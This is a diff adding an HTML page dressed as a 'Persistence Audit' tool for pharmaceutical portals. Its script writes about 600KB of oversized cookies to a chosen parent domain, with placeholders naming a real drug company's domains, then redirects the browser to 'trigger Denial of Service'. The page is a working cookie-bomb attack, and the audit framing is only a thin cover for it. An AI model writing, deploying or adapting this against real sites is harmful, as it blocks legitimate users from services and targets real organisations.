@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PharmaSec | Infrastructure Resilience Tool</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f9; display: flex; justify-content: center; padding-top: 50px; }
+        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 500px; border-left: 5px solid #b3261e; }
+        h2 { color: #b3261e; margin-top: 0; }
+        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 0.9rem; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .warning { font-size: 0.8rem; color: #666; background: #fff3f3; padding: 10px; border-radius: 4px; margin: 15px 0; border: 1px solid #f8d7da; }
+        button { background: #b3261e; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #8e1f18; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>🧬 500KB+ Persistence Audit</h2>
+    <p style="font-size: 0.9rem;">This tool simulates a stored cookie bomb to test header limits on pharma portals.</p>
+    
+    <div class="warning">
+        <strong>Note:</strong> This will store ~600KB of cookies in your browser for the chosen domain. You must manually clear cookies to restore access.
+    </div>
+
+    <label>Target Parent Domain (Scope):</label>
+    <input type="text" id="pDomain" placeholder="e.g., .astrazeneca.com" value=".">
+
+    <label>Redirect Subdomain (Live Check):</label>
+    <input type="text" id="sDomain" placeholder="https://trials.astrazeneca.com">
+
+    <button onclick="deployMegaBomb()">🚀 EXECUTE 600KB BINDING</button>
+</div>
+
+<script>
+    function deployMegaBomb() {
+        const parent = document.getElementById('pDomain').value.trim();
+        const target = document.getElementById('sDomain').value.trim();
+
+        if (parent === "." || !target.startsWith('http')) {
+            alert("Please provide a valid Parent Domain (starting with a dot) and a Target URL.");
+            return;
+        }
+
+        try {
+            // We set 150 cookies, each ~4KB. Total = 600KB.
+            // This exceeds almost every modern pharmaceutical WAF limit.
+            for (let i = 0; i < 150; i++) {
+                let payload = "PHARMA_AUDIT_DATA_" + "X".repeat(3980) + i;
+                document.cookie = `bomb_id_${i}=${payload}; Domain=${parent}; Path=/; Max-Age=3600; SameSite=Lax`;
+            }
+
+            alert("600KB Payload Stored. Redirecting to trigger Denial of Service...");
+            window.location.href = target;
+
+        } catch (e) {
+            alert("Error: " + e.message);
+        }
+    }
+</script>
+
+</body>
+</html>
